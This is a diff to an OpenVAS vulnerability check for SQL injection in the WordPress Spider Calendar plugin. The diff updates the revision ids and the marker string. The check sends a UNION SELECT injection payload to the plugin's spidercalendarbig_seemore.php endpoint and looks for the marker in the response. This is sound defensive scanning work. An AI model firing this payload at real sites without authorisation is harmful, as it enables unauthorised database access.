@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wordpress_spider_calendar_plugin_mult_sql_inj_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_wordpress_spider_calendar_plugin_mult_sql_inj_vuln.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # WordPress Spider Calendar Plugin Multiple SQL Injection Vulnerabilities
 #
@@ -29,7 +29,7 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803101");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11435 $");
   script_bugtraq_id(55779);
   script_tag(name:"last_modification", value:"$Date: 2017-04-25 14:51:04 +0200 (Di, 25 Apr 2017)$");
   script_tag(name:"creation_date", value:"2012-10-18 19:07:20 +0530 (Thu, 18 Oct 2012)");
@@ -80,9 +80,9 @@ if(dir == "/") dir = "";
 
 foreach plugin (make_list("spider-calendar", "calendar")){
 
-  url = dir + '/wp-content/plugins/' + plugin + '/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null%20union%20all%20select%201,1,1,1,0x4f70656e564153,1,1,1,1,1,1,1,1,1,1,1,1+--+';
+  url = dir + '/wp-content/plugins/' + plugin + '/front_end/spidercalendarbig_seemore.php?theme_id=5&ev_ids=1&calendar_id=null%20union%20all%20select%201,1,1,1,0x53514c692d54657374,1,1,1,1,1,1,1,1,1,1,1,1+--+';
 
-  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"OpenVAS<")){
+  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"SQLi-Test<")){
     report = report_vuln_url(port:port, url:url);
     security_message(port:port, data:report);
     exit(0);
